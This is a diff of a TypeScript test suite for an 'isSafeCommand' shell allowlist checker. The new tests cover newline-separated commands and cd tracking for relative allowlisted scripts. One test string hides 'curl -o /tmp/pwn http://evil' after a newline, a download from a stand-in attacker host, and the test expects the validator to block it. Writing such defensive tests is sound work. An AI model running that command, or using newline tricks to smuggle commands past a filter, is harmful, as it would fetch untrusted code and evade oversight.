@@ -100,8 +100,20 @@ describe("isSafeCommand", () => {
     assert.equal(safe("ls -la /tmp"), true);
   });
 
-  it("allows safe prefix with newline continuation", () => {
-    assert.equal(safe("grep\n-r foo ."), true);
+  it("allows backslash-newline continuation", () => {
+    assert.equal(safe("grep \\\n-r foo ."), true);
+  });
+
+  it("splits on bare newline like ; (second line checked separately)", () => {
+    assert.equal(safe("ls\ncat file"), true);
+  });
+
+  it("blocks unsafe command hidden after a newline", () => {
+    assert.equal(safe("ls\ncurl -o /tmp/pwn http://evil"), false);
+  });
+
+  it("blocks bare-newline continuation of args (bash runs them as a command)", () => {
+    assert.equal(safe("grep\n-r foo ."), false);
   });
 
   it("allows git status with extra args", () => {
@@ -444,6 +456,77 @@ describe("isSafeCommand -- new segment dangerous patterns", () => {
 
   it("allows sort -r (not -o)", () => {
     assert.equal(safe("sort -r names.txt"), true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// cd tracking and relative command resolution
+// ---------------------------------------------------------------------------
+describe("isSafeCommand -- cd tracking", () => {
+  const scriptPrefixes = [
+    ...DEFAULT_SAFE_PREFIXES,
+    "/skills/phab/scripts/conduit.sh user.whoami",
+    "/skills/phab/scripts/phab-get.sh",
+  ];
+  function safeWith(cmd: string) {
+    return isSafeCommand(cmd, scriptPrefixes, defaultRegexes, defaultSegmentRegexes);
+  }
+
+  it("allows cd && relative allowlisted script", () => {
+    assert.equal(safeWith("cd /skills/phab/scripts && ./conduit.sh user.whoami | head -5 && date"), true);
+  });
+
+  it("allows ../ resolution", () => {
+    assert.equal(safeWith("cd /skills/phab/scripts/sub && ../phab-get.sh T123"), true);
+    assert.equal(safeWith("cd /skills/phab/other && cd ../scripts && ./phab-get.sh T123"), true);
+  });
+
+  it("allows relative cd chained from absolute cd", () => {
+    assert.equal(safeWith("cd /skills/phab && cd scripts && ./phab-get.sh T123"), true);
+  });
+
+  it("allows cd to a var-expanded literal dir", () => {
+    assert.equal(safeWith("D=/skills/phab/scripts; cd $D && ./phab-get.sh T123"), true);
+  });
+
+  it("survives intermediate && segments", () => {
+    assert.equal(safeWith("cd /skills/phab/scripts && ls && ./phab-get.sh T123"), true);
+  });
+
+  it("blocks relative script after ; (cd may have failed)", () => {
+    assert.equal(safeWith("cd /skills/phab/scripts; ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script when cd ran in a pipeline subshell", () => {
+    assert.equal(safeWith("echo x | cd /skills/phab/scripts && ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script when cd is || fallback (may be skipped)", () => {
+    assert.equal(safeWith("ls || cd /skills/phab/scripts && ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script after cd to unknown variable", () => {
+    assert.equal(safeWith("cd $UNKNOWN && ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script after cd to substitution result", () => {
+    assert.equal(safeWith("cd $(pwd) && ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative cd without a known base", () => {
+    assert.equal(safeWith("cd scripts && ./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script with no cd at all", () => {
+    assert.equal(safeWith("./phab-get.sh T123"), false);
+  });
+
+  it("blocks relative script after newline (separator, not &&)", () => {
+    assert.equal(safeWith("cd /skills/phab/scripts\n./phab-get.sh T123"), false);
+  });
+
+  it("does not resolve to a non-allowlisted path", () => {
+    assert.equal(safeWith("cd /elsewhere && ./phab-get.sh T123"), false);
   });
 });
 
